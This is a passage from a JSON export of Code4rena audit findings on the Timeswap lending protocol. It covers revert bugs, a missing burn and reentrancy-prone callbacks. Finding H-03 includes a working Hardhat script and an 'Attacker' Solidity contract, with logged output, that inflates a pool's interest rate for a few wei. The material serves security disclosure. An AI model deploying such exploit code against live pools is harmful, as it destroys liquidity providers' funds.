      "content": "_Submitted by sirhashalot_\n\nThe `safeName()` function, found in the SafeMetadata.sol contract and called in 4 Timeswap Convenience contracts in the `name()` functions, can cause a revert. This could make the 4 contracts not compliant with the ERC20 standard for certain asset pairs, because the `name()` function should return a string and not revert.\n\nThe root cause of the issue is that the `safeName()` function assumes the return type of any ERC20 token to be a string. If the return value is not a string, abi.decode() will revert, and this will cause the `name()` functions in the Timeswap ERC20 contracts to revert. There are some tokens that aren't compliant, such as Sai from Maker, which returns a bytes32 value:\n<https://kauri.io/#single/dai-token-guide-for-developers/#token-info>\n\nBecause this is known to cause issues with tokens that don't fully follow the ERC20 spec, the `safeName()` function in the BoringCrypto library has a fix for this. The BoringCrypto `safeName()` function is similar to the one in Timeswap but it has a `returnDataToString()` function that handles the case of a bytes32 return value for a token name:\n<https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47>\n\n#### Proof of Concept\n\nThe root cause is [line 12](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L12) of the `safeName()` function in SafeMetadata.sol\n\nThe `safeName()` function is called in:\n\n*   [Bond.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L20-L25)\n*   [CollateralizedDebt.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L22-L36)\n*   [Insurance.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L20-L27)\n*   [Liquidity.sol](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Liquidity.sol#L22-L29)\n\n#### Recommended Mitigation Steps\n\nUse the BoringCrypto `safeName()` function code to handle the case of a bytes32 return value:\n<https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L15-L47>\n\n\n**[Mathepreneur (Timeswap) confirmed and resolved](https://github.com/code-423n4/2022-01-timeswap-findings/issues/113):**\n > https://github.com/Timeswap-Labs/Timeswap-V1-Convenience/pull/60\n\n\n\n",
      "summary": "\nA bug has been identified in the `safeName()` function found in the SafeMetadata.sol contract which is called in four Timeswap Convenience contracts in the `name()` functions. This bug can cause a revert which could make the four contracts not compliant with the ERC20 standard, as the `name()` function should return a string and not revert.\n\nThe root cause of the issue is that the `safeName()` function assumes the return type of any ERC20 token to be a string, however, there are some tokens that aren't compliant, such as Sai from Maker, which returns a bytes32 value. This is known to cause issues with tokens that don't fully follow the ERC20 spec.\n\nThe root cause is line 12 of the `safeName()` function in SafeMetadata.sol and the `safeName()` function is called in four contracts: Bond.sol, CollateralizedDebt.sol, Insurance.sol, and Liquidity.sol.\n\nThe recommended mitigation step is to use the BoringCrypto `safeName()` function code to handle the case of a bytes32 return value. This bug has been confirmed and resolved by Mathepreneur (Timeswap).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/113",
      "tags": [],
      "finders": []
    },
    {
      "id": "25639",
      "title": "[M-02] safeDecimals can revert causing DoS",
      "impact": "MEDIUM",
      "content": "_Submitted by sirhashalot_\n\nThe `safeDecimals()` function, found in the SafeMetadata.sol contract and called in 3 different Timeswap Convenience contracts, can cause a revert. This is because the safeDecimals function attempts to use abi.decode to return a uint8 when `data.length >= 32`. However, a data.length value greater than 32 will cause abi.decode to revert.\n\nA similar issue was found in a previoud code4rena contest: <https://github.com/code-423n4/2021-05-nftx-findings/issues/46>\n\n#### Proof of Concept\n\nThe root cause is [line 28](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/libraries/SafeMetadata.sol#L28) of the `safeDecimals()` function in SafeMetadata.sol\n\nThe following link shows the `safeDecimals()` function in the BoringCrypto library, which might be where this code was borrowed from, uses the strict equality check `data.length == 32`\n<https://github.com/boringcrypto/BoringSolidity/blob/ccb743d4c3363ca37491b87c6c9b24b1f5fa25dc/contracts/libraries/BoringERC20.sol#L54>\n\n`safeDecimals()` is used in multiple functions such as\n\n*   CollateralizedDebt.sol [line 50](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L50) and [line 54](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L54)\n*   Bond.sol [line 34](https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/Bond.sol#L34)\n*   Insurance.sol [line 36](https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/Insurance.sol#L36)\n\n#### Recommended Mitigation Steps\n\nModify the `safeDecimals()` function to change >= 32 to == 32 like this\n`if (success && data.length == 32) return   abi.decode(data, (uint8));`\n\n**[Mathepreneur (Timeswap) confirmed and resolved](https://github.com/code-423n4/2022-01-timeswap-findings/issues/112):**\n > https://github.com/Timeswap-Labs/Timeswap-V1-Convenience/pull/61\n\n\n\n",
      "summary": "\nA bug was reported in the `safeDecimals()` function found in the SafeMetadata.sol contract and called in 3 different Timeswap Convenience contracts. The bug causes a revert when `data.length` is greater than 32, as `abi.decode` is unable to process this data. A similar issue was found in a previous code4rena contest.\n\nThe root cause is line 28 of the `safeDecimals()` function in SafeMetadata.sol, which is where the issue originated. A comparison of this code to the `safeDecimals()` function in the BoringCrypto library, which might be where the code was borrowed from, revealed that it uses a strict equality check `data.length == 32`.\n\nThe `safeDecimals()` function is used in multiple functions such as CollateralizedDebt.sol, Bond.sol, and Insurance.sol.\n\nTo mitigate the issue, it is recommended that the `safeDecimals()` function be modified to change `>= 32` to `== 32` like this: `if (success && data.length == 32) return   abi.decode(data, (uint8));`. Timeswap (Mathepreneur) confirmed and resolved the bug, and the fix can be found in the link provided.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/112",
      "tags": [],
      "finders": []
    },
    {
      "id": "25638",
      "title": "[M-01] `burn()` doesn't call ERC721 `_burn()`",
      "impact": "MEDIUM",
      "content": "_Submitted by sirhashalot_\n\nThe CollateralizedDebt.sol contract is a ERC721 token. It has a `mint()` function, which uses the underlying `safeMint()` function to create an ERC721 token representing a collateral position. The `burn()` function in CollateralizedDebt.sol should reverse the actions of `mint()` by burning the ERC721 token, but the ERC721 `_burn()` function is never called. This means a user can continue to hold their ERC721 token representing their position after receiving their funds. This is unlike the `burn()` function found in Bond.sol, Insurance.sol, and Liquidity.sol, which all call the `_burn()` function (though note the `_burn()` function in these other Timeswap Convenience contracts is the ERC20 `_burn()`).\n\n#### Proof of Concept\n\nThe problematic `burn()` function is found in CollareralizedDebt.sol\n<https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L80-L88>\n\nCompare this function to the `burn()` functions defined in the other Timeswap Convenience contracts, which contain calls to `_burn()`\n\n#### Recommended Mitigation Steps\n\nInclude the following line in the `burn()` function\n`_burn(id);`\n\n**[Mathepreneur (Timeswap) acknowledged](https://github.com/code-423n4/2022-01-timeswap-findings/issues/111):**\n > If decided not to burn the ERC721 token at all. The burn in this context is burning the debt and collateral locked balance in the ERC721 token.\n\n\n\n",
      "summary": "\nThis bug report is about the `burn()` function in the CollateralizedDebt.sol contract, which is an ERC721 token. The `burn()` function should reverse the actions of the `mint()` function by burning the ERC721 token, but the `_burn()` function is never called. This means a user can continue to hold their ERC721 token representing their position after receiving their funds, unlike the `burn()` functions found in other Timeswap Convenience contracts. To fix this bug, the `burn()` function should include the line `_burn(id);`. The bug has been acknowledged by Mathepreneur (Timeswap).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/111",
      "tags": [],
      "finders": []
    },
    {
      "id": "25637",
      "title": "[H-07] pay() function has callback to msg.sender before important state updates",
      "impact": "HIGH",
      "content": "_Submitted by jayjonah8_\n\nIn TimeswapPair.sol, the `pay()` function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserves collateral and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L369>\n\n- <https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html>\n\n- cross function reentrancy\n<https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21>\n\n\n#### Recommended Mitigation Steps\n\nThe callback \"if (assetIn > 0) Callback.pay(asset, assetIn, data);\"  should be placed at the end of the pay() function after all state updates have taken place.\n\n**[Mathepreneur (Timeswap) confirmed and resolved](https://github.com/code-423n4/2022-01-timeswap-findings/issues/7):**\n > https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/104\n\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the `pay()` function of TimeswapPair.sol. This function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback. This can be extremely dangerous, especially when interacting with other protocols and contracts, as it violates the Checks Effects Interactions best practices. This also creates a risk of cross function reentrancy. \n\nThe recommended mitigation step is to place the callback \"if (assetIn > 0) Callback.pay(asset, assetIn, data);\" at the end of the pay() function after all state updates have taken place. This has been confirmed and resolved by Timeswap.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/7",
      "tags": [],
      "finders": []
    },
    {
      "id": "25636",
      "title": "[H-06] borrow() function has state updates after a callback to msg.sender",
      "impact": "HIGH",
      "content": "_Submitted by jayjonah8_\n\nIn TimeswapPair.sol, the `borrow()` function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to collateral, totalDebtCreated and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L322>\n\n- <https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html>\n\n- cross function reentrancy\n<https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21>\n\n#### Recommended Mitigation Steps\n\nThe callback Callback.borrow(collateral, dueOut.collateral, data); should be placed at the end of the borrow() function after all state updates have taken place.\n\n**[Mathepreneur (Timeswap) confirmed and resolved](https://github.com/code-423n4/2022-01-timeswap-findings/issues/6):**\n > https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/105\n\n\n\n",
      "summary": "\nA bug was reported in TimeswapPair.sol, a Solidity smart contract. The `borrow()` function had a callback to the msg.sender in the middle of the function while there were still updates to state that take place after the callback. This could lead to cross function reentrancy, a type of attack where malicious actors can exploit a contract’s vulnerability to gain access to its resources. The callback also violated the Checks Effects Interactions best practices, which further widened the attack surface.\n\nThe recommended mitigation step was to move the callback to the end of the borrow() function after all state updates have taken place. This was confirmed and resolved by Timeswap (Mathepreneur).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/6",
      "tags": [],
      "finders": []
    },
    {
      "id": "25635",
      "title": "[H-05] In the lend() function state updates are made after the callback",
      "impact": "HIGH",
      "content": "_Submitted by jayjonah8_\n\nIn TimeswapPair.sol, the `lend()` function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to totalClaims bonds,  insurance and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L246>\n\n- <https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html>\n\n- cross function reentrancy\n<https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21>\n\n\n#### Recommended Mitigation Steps\n\nThe callback Callback.lend(asset, xIncrease, data); should be placed at the end of the lend() function after all state updates have taken place.\n\n**[Mathepreneur (Timeswap) confirmed and resolved](https://github.com/code-423n4/2022-01-timeswap-findings/issues/5):**\n > https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/106\n\n\n\n",
      "summary": "\nA bug has been reported in the `lend()` function of TimeswapPair.sol, which is part of the Timeswap protocol. This bug could cause serious issues, especially when interacting with other protocols and contracts, as it does not guard against cross function reentrancy. This also violates the Checks Effects Interactions best practices. \n\nA proof of concept for this bug can be found at the following links:\n- <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L246>\n- <https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html>\n- <https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21>\n\nThe recommended mitigation step for this bug is to move the callback Callback.lend(asset, xIncrease, data); to the end of the `lend()` function after all state updates have taken place. This bug has been confirmed and resolved by Timeswap, and the fix can be found here: <https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/106>.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/5",
      "tags": [],
      "finders": []
    },
    {
      "id": "25634",
      "title": "[H-04] Important state updates are made after the callback in the mint() function",
      "impact": "HIGH",
      "content": "_Submitted by jayjonah8_\n\nIn TimeswapPair.sol, the `mint()` function has a callback in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserve asset, collateral, and totalDebtCreated) also violates the Checks Effects Interactions best practices further widening the attack surface.\n\n#### Proof of Concept\n\n- <https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L177>\n\n- <https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html>\n\n- cross function reentrancy\n<https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21>\n\n\n#### Recommended Mitigation Steps\n\nThe callback Callback.mint(asset, collateral, xIncrease, dueOut.collateral, data) should be placed at the end of the mint() function after all state updates have taken place.\n\n**[Mathepreneur (Timeswap) confirmed and resolved](https://github.com/code-423n4/2022-01-timeswap-findings/issues/4):**\n > https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/107\n\n\n\n",
      "summary": "\nA bug has been identified in the TimeswapPair.sol contract, which is related to the `mint()` function. The issue is that the `mint()` function has a callback in the middle of the function while there are still updates to state that take place after the callback. This can be dangerous as it could lead to cross-function reentrancy, which can cause issues with composability and interacting with other protocols and contracts. This also violates the Checks Effects Interactions best practices. To mitigate this issue, the callback should be placed at the end of the `mint()` function after all state updates have taken place. The bug has been confirmed and resolved by Mathepreneur (Timeswap).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/4",
      "tags": [],
      "finders": []
    },
    {
      "id": "25633",
      "title": "[H-03] Manipulation of the Y State Results in Interest Rate Manipulation",
      "impact": "HIGH",
      "content": "_Submitted by Rhynorater, also found by harleythedog, hyh, and WatchPug_\n\nDue to lack of constraints on user input in the `TimeswapPair.sol#mint` function, an attacker can arbitrarily modify the interest rate while only paying a minimal amount of Asset Token and Collateral Token.\n\nDisclosure: This is my first time attempting Ethereum hacking, so I might have made some mistakes here since the math is quite complex, but I'm going to give it a go.\n\n#### Proof of Concept\n\nThe attack scenario is this: A malicious actor is able to hyper-inflate the interest rate on a pool by triggering a malicious mint function. The malicious actor does this to attack the LP and other members of the pool.\n\nConsider the following HardHat script:\n\n```js\nconst hre = require(\"hardhat\");\n\n\n//jtok is asset\n//usdc is collat\n\nasync function launchTestTokens(tokenDeployer){\n    //Launch a token\n    const TestToken = await ethers.getContractFactory(\"TestToken\", signer=tokenDeployer);\n    const tt = await TestToken.deploy(\"JTOK\", \"JTOK\", 1000000000000000)\n    const tt2 = await TestToken.deploy(\"USDC\", \"USDC\", 1000000000000000)\n    let res = await tt.balanceOf(tokenDeployer.address)\n    let res2 = await tt.balanceOf(tokenDeployer.address)\n    console.log(\"JTOK balance: \"+res)\n    console.log(\"USDC balance: \"+res2)\n    return [tt, tt2]\n}\n\nasync function deployAttackersContract(attacker, jtok, usdc){\n    const Att = await ethers.getContractFactory(\"Attacker\", signer=attacker)\n    const atakcontrak = await Att.deploy(jtok.address, usdc.address)\n    return atakcontrak\n}\n\nasync function deployLPContract(lp, jtok, usdc){\n    const LP = await ethers.getContractFactory(\"LP\", signer=lp)\n    const lpc = await LP.deploy(jtok.address, usdc.address)\n    return lpc\n}\n\nasync function main() {\n    const [tokenDeployer, lp, attacker] = await ethers.getSigners();\n    let balance = await tokenDeployer.getBalance()\n    let factory = await ethers.getContractAt(\"TimeswapFactory\", \"0x5FbDB2315678afecb367f032d93F642f64180aa3\", signer=tokenDeployer)\n    //let [jtok, usdc] = await launchTestTokens(tokenDeployer)\n    let jtok = await ethers.getContractAt(\"TestToken\", \"0x2279b7a0a67db372996a5fab50d91eaa73d2ebe6\", signer=tokenDeployer)\n    let usdc = await ethers.getContractAt(\"TestToken\", \"0x8a791620dd6260079bf849dc5567adc3f2fdc318\", signer=tokenDeployer)\n    console.log(\"Jtok: \"+jtok.address)\n    console.log(\"USDC: \"+usdc.address)\n\n    //Create Pair\n    //let txn = await factory.createPair(jtok.address, usdc.address)\n    pairAddress = await factory.getPair(jtok.address, usdc.address)\n    pair = await ethers.getContractAt(\"TimeswapPair\", pairAddress, signer=tokenDeployer)\n    console.log(\"Pair address: \"+pairAddress);\n\n    // Deploy LP\n    //let lpc = await deployLPContract(lp, jtok, usdc)\n    let lpc = await ethers.getContractAt(\"LP\", \"0x948b3c65b89df0b4894abe91e6d02fe579834f8f\", signer=lp)\n\n\n    let jtokb = await jtok.balanceOf(lpc.address)\n    let usdcb = await usdc.balanceOf(lpc.address)\n    console.log(\"LP Jtok: \"+jtokb)\n    console.log(\"LP USDC: \"+usdcb)\n\n    //let txn2 = await lpc.timeswapMint(1641859791, 15, pairAddress)\n    let res = await pair.constantProduct(1641859791);\n    console.log(\"Post LP Constants:\", res);\n\n    let atakcontrak = await deployAttackersContract(attacker, jtok, usdc)\n\n    jtokb = await jtok.balanceOf(atakcontrak.address)\n    usdcb = await usdc.balanceOf(atakcontrak.address)\n    console.log(\"Attacker Jtok: \"+jtokb)\n    console.log(\"Attacker USDC: \"+usdcb)\n\n    //mint some tokens\n    let txn2 = await atakcontrak.timeswapMint(1641859791, 15, pairAddress)\n\n    let res2 = await pair.constantProduct(1641859791);\n    console.log(\"Post Attack Constants:\", res2);\n\n}\nmain().then(()=>process.exit(0))\n\n```\n\nFirst, the LP deploys their pool and contributes their desired amount of tokens with the below contract:\n\n```solidity\npragma solidity =0.8.4;\n\nimport \"hardhat/console.sol\";\nimport {ITimeswapMintCallback} from \"./interfaces/callback/ITimeswapMintCallback.sol\";\nimport {IPair} from \"./interfaces/IPair.sol\";\nimport {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';\ninterface TestTokenLP is IERC20{\n    function mmint(uint256 amount) external;\n}\n\ncontract LP is ITimeswapMintCallback {\n\n    uint112 constant SEC_PER_YEAR = 31556926;\n    TestTokenLP internal jtok;\n    TestTokenLP internal usdc;\n\nconstructor(address _jtok, address _usdc){\n    jtok = TestTokenLP(_jtok);\n    jtok.mmint(10_000 ether);\n    usdc = TestTokenLP(_usdc);\n    usdc.mmint(10_000 ether);\n}\n\nfunction timeswapMint(uint maturity, uint112 APR, address pairAddress) public{\n    uint256 maturity = maturity;\n    console.log(\"Maturity: \", maturity);\n    address liquidityTo = address(this);\n    address dueTo = address(this);\n    uint112 xIncrease = 5_000 ether;\n    uint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);\n    uint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP\n    IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, \"\");\n}\n\n\nfunction timeswapMintCallback(\n        uint112 assetIn,\n        uint112 collateralIn,\n        bytes calldata data\n    ) override external{\n        jtok.mmint(100_000 ether);\n        usdc.mmint(100_000 ether);\n        console.log(\"Asset requested:\", assetIn);\n        console.log(\"Collateral requested:\", collateralIn);\n        //check before\n        uint256 beforeJtok = jtok.balanceOf(msg.sender);\n        console.log(\"LP jtok before\", beforeJtok);\n        //transfer\n        jtok.transfer(msg.sender, assetIn);\n        //check after\n        uint256 afterJtok = jtok.balanceOf(msg.sender);\n        console.log(\"LP jtok after\", afterJtok);\n        //check before\n        uint256 beforeUsdc = usdc.balanceOf(msg.sender);\n        console.log(\"LP USDC  before\", beforeUsdc);\n        //transfer\n        usdc.transfer(msg.sender, collateralIn);\n        //check after\n        uint256 afterUsdc = usdc.balanceOf(msg.sender);\n        console.log(\"LP USDC After\", afterUsdc);\n        \n    }\n}\n\n```\n\nHere are the initialization values:\n```solidity\nuint112 xIncrease = 5_000 ether;\nuint112 yIncrease = (APR*xIncrease)/(SEC_PER_YEAR*100);\nuint112 zIncrease = (5*xIncrease)/3; //Static 167% CDP\n```\n\nWith this configuration, I've calculated the interest rate to borrow on this pool using the functions defined here: <https://timeswap.gitbook.io/timeswap/deep-dive/borrowing>\nto  be:\n\n```\nyMax: 4.7533146923118e-06\nMin Interest Rate: 0.009374999999999765\nMax Interest Rate: 0.14999999999999625\nzMax: 1666.6666666666667\n\n```\n\nAround 1% to 15%.\n\nThen, the attacker comes along (see line containing `let atakcontrak` and after). The attacker deploys the following contract:\n```solidity\npragma solidity =0.8.4;\n\nimport \"hardhat/console.sol\";\nimport {ITimeswapMintCallback} from \"./interfaces/callback/ITimeswapMintCallback.sol\";\nimport {IPair} from \"./interfaces/IPair.sol\";\nimport {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';\ninterface TestTokenAtt is IERC20{\n    function mmint(uint256 amount) external;\n}\n\ncontract Attacker is ITimeswapMintCallback {\n\n    uint112 constant SEC_PER_YEAR = 31556926;\n    TestTokenAtt internal jtok;\n    TestTokenAtt internal usdc;\n\nconstructor(address _jtok, address _usdc){\n    jtok = TestTokenAtt(_jtok);\n    jtok.mmint(10_000 ether);\n    usdc = TestTokenAtt(_usdc);\n    usdc.mmint(10_000 ether);\n}\n\nfunction timeswapMint(uint maturity, uint112 APR, address pairAddress) public{\n    uint256 maturity = maturity;\n    console.log(\"Maturity: \", maturity);\n    address liquidityTo = address(this);\n    address dueTo = address(this);\n    uint112 xIncrease = 3;\n    uint112 yIncrease = 1000000000000000;\n    uint112 zIncrease = 5; //Static 167% CDP\n    IPair(pairAddress).mint(maturity, liquidityTo, dueTo, xIncrease, yIncrease, zIncrease, \"\");\n}\n\n\nfunction timeswapMintCallback(\n        uint112 assetIn,\n        uint112 collateralIn,\n        bytes calldata data\n    ) override external{\n        jtok.mmint(100_000 ether);\n        usdc.mmint(100_000 ether);\n        console.log(\"Asset requested:\", assetIn);\n        console.log(\"Collateral requested:\", collateralIn);\n        //check before\n        uint256 beforeJtok = jtok.balanceOf(msg.sender);\n        console.log(\"Attacker jtok before\", beforeJtok);\n        //transfer\n        jtok.transfer(msg.sender, assetIn);\n        //check after\n        uint256 afterJtok = jtok.balanceOf(msg.sender);\n        console.log(\"Attacker jtok after\", afterJtok);\n        //check before\n        uint256 beforeUsdc = usdc.balanceOf(msg.sender);\n        console.log(\"Attacker USDC  before\", beforeUsdc);\n        //transfer\n        usdc.transfer(msg.sender, collateralIn);\n        //check after\n        uint256 afterUsdc = usdc.balanceOf(msg.sender);\n        console.log(\"Attacker USDC After\", afterUsdc);\n        \n    }\n}\n```\n\nWhich contains the following settings for a mint:\n```solidity\nuint112 xIncrease = 3;\nuint112 yIncrease = 1000000000000000;\nuint112 zIncrease = 5; //Static 167% CDP\n```\n\nAccording to my logs in hardhat:\n\n```\nMaturity:  1641859791\nCallback before: 8333825816710789998373\nAsset requested: 3\nCollateral requested: 6\nAttacker jtok before 5000000000000000000000\nAttacker jtok after 5000000000000000000003\nAttacker USDC  before 8333825816710789998373\nAttacker USDC After 8333825816710789998379\nCallback after: 8333825816710789998379\nCallback expected after: 8333825816710789998379\n```\n\nThe attacker is only required to pay 3 wei of Asset Token and 6 wei of Collateral token. However, after the attacker's malicious mint is up, the interest rate becomes:\n```\nyMax: 0.0002047533146923118\nMin Interest Rate: 0.40383657499999975\nMax Interest Rate: 6.461385199999996\nzMax: 1666.6666666666667\n```\nBetween 40 and 646 percent.\n\nxyz values before and after:\n\n```\nPost LP Constants: [ BigNumber { value: \"5000000000000000000000\" },\n  BigNumber { value: \"23766573461559\" },\n  BigNumber { value: \"8333333333333333333333\" },\n  x: BigNumber { value: \"5000000000000000000000\" },\n  y: BigNumber { value: \"23766573461559\" },\n  z: BigNumber { value: \"8333333333333333333333\" } ]\nAttacker Jtok: 10000000000000000000000\nAttacker USDC: 10000000000000000000000\nPost Attack Constants: [ BigNumber { value: \"5000000000000000000003\" },\n  BigNumber { value: \"1023766573461559\" },\n  BigNumber { value: \"8333333333333333333338\" },\n  x: BigNumber { value: \"5000000000000000000003\" },\n  y: BigNumber { value: \"1023766573461559\" },\n  z: BigNumber { value: \"8333333333333333333338\" } ]\n\n```\n\nThis result in destruction of the pool.\n\n**[Mathepreneur (Timeswap) confirmed](https://github.com/code-423n4/2022-01-timeswap-findings/issues/187)**\n\n**[CloudEllie (C4) commented](https://github.com/code-423n4/2022-01-timeswap-findings/issues/187#issuecomment-1010049204):**\n > Warden rhynorater requested that we add to his submission.  See comment for details.\n\n\n\n",
      "summary": "\nA bug has been found in the `TimeswapPair.sol#mint` function of the Ethereum blockchain, which allows an attacker to modify the interest rate while only paying a minimal amount of Asset Token and Collateral Token. This bug was discovered by Rhynorater and confirmed by Mathepreneur (Timeswap).\n\nThe attack scenario is as follows: A malicious actor is able to hyper-inflate the interest rate on a pool by triggering a malicious mint function. The malicious actor does this to attack the LP and other members of the pool.\n\nFirst, the LP deploys their pool and contributes their desired amount of tokens with a contract. Initialization values are set to a maximum interest rate of 15%. The attacker then deploys a contract with different values, setting the maximum interest rate to 646%. The attacker is only required to pay 3 wei of Asset Token and 6 wei of Collateral token. This results in destruction of the pool.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2022-01-timeswap",
      "github_link": "https://github.com/code-423n4/2022-01-timeswap-findings/issues/187",
      "tags": [],
      "finders": []
    },
    {
      "id": "25632",
      "title": "[H-02] `TimeswapConvenience.sol#borrowGivenDebt()` Attacker can increase `state.y` to an extremely large value with a dust amount of `assetOut`",
      "impact": "HIGH",
